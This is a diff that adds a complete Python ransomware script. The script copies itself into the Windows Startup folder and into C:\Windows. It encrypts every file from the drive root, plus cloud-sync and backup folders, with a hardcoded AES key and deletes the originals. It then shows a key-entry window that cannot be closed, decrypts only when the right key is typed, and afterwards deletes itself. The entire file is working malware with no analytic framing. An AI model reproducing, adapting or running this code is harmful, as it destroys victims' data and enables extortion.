@@ -1,0 +1,176 @@
+import os
+import shutil
+import sys
+import tkinter as tk
+from tkinter import messagebox
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+ 
+# Fixed key (for both encryption and decryption)
+FIXED_KEY = b"9aF8v6ErY2QaB3tR"  # 16 bytes (128 bits)
+ 
+# List of common backup directories to include in encryption
+BACKUP_DIRECTORIES = [
+    "Documents", "Pictures", "Videos", "Backup", "Downloads",  # Common personal backup directories
+    "Google Drive", "OneDrive", "Dropbox",  # Cloud storage sync folders
+    "External Drives"  # Any external drives (this could be dynamically detected if needed)
+]
+ 
+# Function to replicate the script into the Windows directory (or startup folder)
+def replicate_script():
+    script_path = sys.argv[0]  # Current script's path
+    startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    windows_folder = r"C:\Windows"
+ 
+    # Replicate the script if not already present in the startup folder or Windows directory
+    if not os.path.exists(os.path.join(startup_folder, "self_replicating_script.py")):
+        shutil.copy(script_path, startup_folder)
+ 
+    if not os.path.exists(os.path.join(windows_folder, "self_replicating_script.py")):
+        shutil.copy(script_path, windows_folder)
+ 
+# Function to encrypt a file
+def encrypt_file(file_path, key):
+    with open(file_path, 'rb') as f:
+        data = f.read()
+ 
+    cipher = AES.new(key, AES.MODE_CBC)
+    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+ 
+    # Save encrypted data with IV and a new .enc extension
+    with open(file_path + '.enc', 'wb') as f:
+        f.write(cipher.iv + encrypted_data)
+ 
+    os.remove(file_path)  # Delete the original file
+ 
+# Function to recursively encrypt files in directories
+def encrypt_directory(directory, key):
+    for root, dirs, files in os.walk(directory):
+        # Skip system-critical directories to keep the system functional
+        if 'Windows' in root or 'Program Files' in root or 'System' in root or 'AppData' in root:
+            continue  # Skip this directory and its subdirectories
+ 
+        # Encrypt each file in this directory
+        for file in files:
+            file_path = os.path.join(root, file)
+            if not file.endswith(".enc"):  # Avoid re-encrypting .enc files
+                encrypt_file(file_path, key)
+ 
+# Function to recursively encrypt all directories, including backups
+def encrypt_all():
+    root_directory = os.path.abspath(os.sep)  # This is the root directory (C:\ on Windows)
+ 
+    # Start encryption from the root directory
+    encrypt_directory(root_directory, FIXED_KEY)
+ 
+    # Additionally encrypt common backup directories
+    for backup_dir in BACKUP_DIRECTORIES:
+        if os.path.isdir(backup_dir):
+            encrypt_directory(backup_dir, FIXED_KEY)
+ 
+    messagebox.showinfo("Encryption Complete", "All files have been encrypted.")
+ 
+# Function to decrypt a file
+def decrypt_file(file_path, key):
+    with open(file_path, 'rb') as f:
+        iv = f.read(16)  # First 16 bytes are the IV
+        encrypted_data = f.read()
+ 
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+ 
+    # Save decrypted data, removing .enc extension
+    original_file_path = file_path.replace('.enc', '')
+    with open(original_file_path, 'wb') as f:
+        f.write(decrypted_data)
+ 
+    os.remove(file_path)  # Delete the encrypted file
+ 
+# Function to decrypt all files in the system
+def decrypt_important_folders():
+    root_directory = os.path.abspath(os.sep)  # This is the root directory (C:\ on Windows)
+ 
+    # Decrypt each .enc file in all folders
+    for root, dirs, files in os.walk(root_directory):
+        # Skip system-critical directories
+        if 'Windows' in root or 'Program Files' in root or 'System' in root or 'AppData' in root:
+            continue
+ 
+        for file in files:
+            file_path = os.path.join(root, file)
+            if file.endswith(".enc"):  # Only decrypt .enc files
+                decrypt_file(file_path, FIXED_KEY)
+ 
+    messagebox.showinfo("Decryption Complete", "All files have been decrypted.")
+ 
+# Check the entered key and decrypt if correct
+def check_key():
+    entered_key = entry.get().strip()  # Strip whitespace from the entered key
+ 
+    # Convert the entered key into bytes, ensuring proper encoding
+    entered_key_bytes = entered_key.encode('utf-8')  # Convert the entered key to bytes
+ 
+    # Compare the entered key bytes with the fixed key bytes
+    if entered_key_bytes == FIXED_KEY:
+        decrypt_important_folders()  # Start decryption
+        window.destroy()  # Close the window after decryption
+        remove_script()  # Delete the script after decryption
+    else:
+        messagebox.showerror("Incorrect Key", "The key you entered is incorrect.")
+        entry.delete(0, tk.END)  # Clear the entry field
+        entry.focus_set()  # Refocus for re-entry
+ 
+# Function to delete the script from the system after decryption
+def remove_script():
+    script_path = sys.argv[0]  # Get current script path
+    try:
+        # Remove the script from both Windows and startup folders
+        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+        windows_folder = r"C:\Windows"
+ 
+        if os.path.exists(os.path.join(startup_folder, "self_replicating_script.py")):
+            os.remove(os.path.join(startup_folder, "self_replicating_script.py"))
+ 
+        if os.path.exists(os.path.join(windows_folder, "self_replicating_script.py")):
+            os.remove(os.path.join(windows_folder, "self_replicating_script.py"))
+ 
+        # Finally remove the script itself
+        os.remove(script_path)
+        messagebox.showinfo("Self Deletion", "Script deleted successfully.")
+ 
+    except Exception as e:
+        messagebox.showerror("Error", f"An error occurred while trying to delete the script: {e}")
+ 
+# GUI setup
+def open_decryption_window():
+    global window, entry
+    window = tk.Tk()
+    window.title("Enter Decryption Key")
+    window.configure(bg="black")
+    window.geometry("400x200")
+ 
+    # Label
+    label = tk.Label(window, text="Enter decryption key to unlock files:", fg="red", bg="black", font=("Helvetica", 12))
+    label.pack(pady=20)
+ 
+    # Key entry
+    entry = tk.Entry(window, show="*", font=("Helvetica", 12))
+    entry.pack(pady=10)
+ 
+    # Button to enter the key
+    enter_button = tk.Button(window, text="Enter Key", command=check_key, bg="black", fg="red", font=("Helvetica", 12))
+    enter_button.pack(pady=10)
+ 
+    # Prevent closing the window without correct key
+    window.protocol("WM_DELETE_WINDOW", lambda: None)
+ 
+    window.mainloop()
+ 
+# Replicate the script into startup or Windows directory
+replicate_script()
+ 
+# Encrypt all files in the system (starting from root and excluding system folders)
+encrypt_all()
+ 
+# Open decryption GUI directly
+open_decryption_window()
